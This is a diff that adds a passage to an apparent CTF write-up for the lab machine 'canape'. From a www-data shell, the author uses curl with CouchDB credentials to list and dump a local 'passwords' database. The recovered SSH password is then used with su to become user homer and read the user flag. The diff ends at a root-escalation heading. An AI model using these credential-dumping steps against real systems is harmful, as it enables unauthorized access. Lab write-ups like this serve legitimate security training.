@@ -598,3 +598,54 @@ www-data@canape:/tmp/Privesc$ curl http://couchara:couchapass@127.0.0.1:5984/pas
 ```
 
 <br />
+
+The database has `documents available`, so we `list` them:
+
+<br />
+
+```bash
+www-data@canape:/tmp/Privesc$ curl http://couchara:couchapass@127.0.0.1:5984/passwords/_all_docs
+{"total_rows":4,"offset":0,"rows":[
+{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
+{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
+{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
+{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
+]}
+```
+
+<br />
+
+Once listed, we `dump` the `conten`t of the `first document` referencing its `ID`:
+
+<br />
+
+```bash
+www-data@canape:/tmp/Privesc$ curl http://couchara:couchapass@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
+{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
+```
+
+<br />
+
+It has a very good looking `password`, let's `test` if it's valid for `user homer`:
+
+<br />
+
+```bash
+www-data@canape:/tmp/Privesc$ su homer
+Password: 
+homer@canape:/tmp/Privesc$ 
+homer@canape:/tmp/Privesc$ whoami
+homer
+homer@canape:/tmp/Privesc$ cd
+homer@canape:~$ cat user.txt
+bece4a9c7bf0b7de80d881ab69c307cb
+```
+
+<br />
+
+GG, user.txt flag owned.
+
+# Privilege Escalation: homer -> root
+
+<br />
+
